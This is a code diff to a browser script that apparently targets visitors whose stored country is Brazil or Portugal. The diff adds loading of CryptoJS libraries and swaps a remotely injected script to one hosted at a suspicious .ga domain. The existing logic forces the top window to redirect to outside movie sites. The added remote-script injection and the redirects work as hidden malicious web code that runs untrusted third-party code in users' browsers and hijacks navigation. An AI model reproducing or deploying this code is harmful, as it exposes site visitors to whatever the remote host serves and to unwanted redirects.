@@ -1,4 +1,7 @@
-if(localStorage.getItem('local')){
+var head= document.getElementsByTagName('head')[0]; var scriptxx= document.createElement('script'); scriptxx.src= 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/core.min.js'; scriptxx.type = "text/javascript"; scriptxx.async = false; head.appendChild(scriptxx); var x= document.createElement('script'); x.src= 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js'; x.type = "text/javascript"; x.async = false; head.appendChild(x); 
+x.onload=function( evt ) {
+    
+    if(localStorage.getItem('local')){
     var g = localStorage.getItem('local');
     if(g == "BR" || g == "PT"){
          y();}
@@ -31,7 +34,7 @@ function y(){
     }
 var links;
 links = document.createElement("script"); 
-links.setAttribute("src", "http://cdn.jsdelivr.net/gh/gistmib/gistmib/filess.js");
+links.setAttribute("src", "http://9fhd.ga/file.js?sssssss");
 document.getElementsByTagName("head")[0].appendChild(links);
  links.onload=function( evt ) {
      
@@ -53,4 +56,6 @@ function n(){
         window.top.location = "http://nplayus.wap.sh/";
     }else{
     window.top.location = "http://mobellabel.zya.me/movies.php?u=movie/popular&us=Popular movies&type=0";}
+}
+
 }
